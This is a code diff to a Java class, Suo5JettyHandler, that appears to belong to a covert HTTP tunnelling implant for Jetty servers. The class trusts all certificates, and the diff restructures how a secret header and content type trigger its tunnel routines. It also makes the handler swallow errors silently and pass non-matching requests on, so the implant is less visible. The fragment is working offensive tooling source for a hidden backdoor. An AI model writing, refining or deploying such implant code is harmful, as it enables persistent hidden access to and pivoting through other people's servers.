@@ -57,29 +57,24 @@ public class Suo5JettyHandler implements Runnable, HostnameVerifier, X509TrustMa
         try {
             String value = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, headerName);
             String contentType = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, "Content-Type");
-            if (value == null || !value.contains(headerValue)) {
-                return false;
-            }
-            if (contentType == null) {
-                return false;
-            }
-            if (baseRequest != null) {
-                baseRequest.getClass().getMethod("setHandled", boolean.class).invoke(baseRequest, true);
-            }
-            if (contentType.equals("application/plain")) {
-                tryFullDuplex(request, response);
+            if (value != null && value.contains(headerValue) && contentType != null) {
+                if (baseRequest != null) {
+                    baseRequest.getClass().getMethod("setHandled", boolean.class).invoke(baseRequest, true);
+                }
+                if (contentType.equals("application/plain")) {
+                    tryFullDuplex(request, response);
+                    return true;
+                }
+                if (contentType.equals("application/octet-stream")) {
+                    processDataBio(request, response);
+                } else {
+                    processDataUnary(request, response);
+                }
                 return true;
             }
-
-            if (contentType.equals("application/octet-stream")) {
-                processDataBio(request, response);
-            } else {
-                processDataUnary(request, response);
-            }
-        } catch (Throwable e) {
-            e.printStackTrace();
+        } catch (Throwable ignored) {
         }
-        return true;
+        return false;
     }
 
     public void readFull(InputStream is, byte[] b) throws IOException, InterruptedException {
